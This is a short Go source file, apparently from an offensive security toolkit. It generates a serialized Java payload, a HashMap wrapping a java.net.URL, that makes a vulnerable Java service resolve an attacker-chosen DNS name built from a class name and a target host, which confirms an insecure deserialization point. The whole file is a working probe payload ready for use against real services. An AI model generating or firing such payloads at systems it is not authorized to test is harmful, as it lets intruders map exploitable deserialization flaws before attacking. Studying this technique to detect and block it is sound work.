package payload

import (
	"encoding/binary"
	"log"
	"net/url"
	"strings"
)

// Poc checks whether deserialize point exists
func Poc(u string, classname string) []byte {
	var (
		prefix  = []byte("\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x01sr\x00\x0cjava.net.URL\x96%76\x1a\xfc\xe4r\x03\x00\x07I\x00\x08hashCodeI\x00\x04portL\x00\tauthorityt\x00\x12Ljava/lang/String;L\x00\x04fileq\x00~\x00\x03L\x00\x04hostq\x00~\x00\x03L\x00\x08protocolq\x00~\x00\x03L\x00\x03refq\x00~\x00\x03xp\xff\xff\xff\xff\xff\xff\xff\xfft")
		midfix  = []byte("t\x00\x00q\x00~\x00\x05t\x00\x04httppxt")
		postfix = []byte("\x78")
	)

	if !strings.Contains(u, "://") {
		u = "http://" + u
	}

	_u, err := url.Parse(u)
	if err != nil {
		log.Fatal(err)
	}
	h := classname + "." + _u.Hostname()
	hp := classname + "." + _u.Host
	log.Printf("use dns host: %v", h)

	buf := make([]byte, 0)
	buf = append(postfix, buf...)
	buf = append([]byte(hp), buf...)

	buf = append(make([]byte, 2), buf...)
	binary.BigEndian.PutUint16(buf, uint16(len(hp)))

	buf = append(midfix, buf...)
	buf = append([]byte(h), buf...)

	buf = append(make([]byte, 2), buf...)
	binary.BigEndian.PutUint16(buf, uint16(len(h)))

	buf = append(prefix, buf...)
	return buf
}
